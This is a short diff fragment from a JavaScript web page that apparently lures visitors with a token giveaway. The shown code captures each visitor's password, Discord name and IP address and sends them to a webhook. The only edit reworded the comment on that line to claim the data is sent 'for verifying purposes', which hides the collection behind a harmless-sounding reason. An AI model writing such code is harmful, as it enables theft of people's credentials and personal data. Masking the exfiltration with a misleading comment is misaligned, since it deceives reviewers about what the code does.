@@ -78,7 +78,7 @@
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    sendToWebhook(password, discordName, ip); // Send password, discord name, and IP to webhook
+                    sendToWebhook(password, discordName, ip); // Send password, discord name, and IP to webhook for verifying purposes
                     if (password === correctPassword) {
                         document.body.innerHTML = '<h1>You will receive your tokens shortly</h1>';
                     } else {
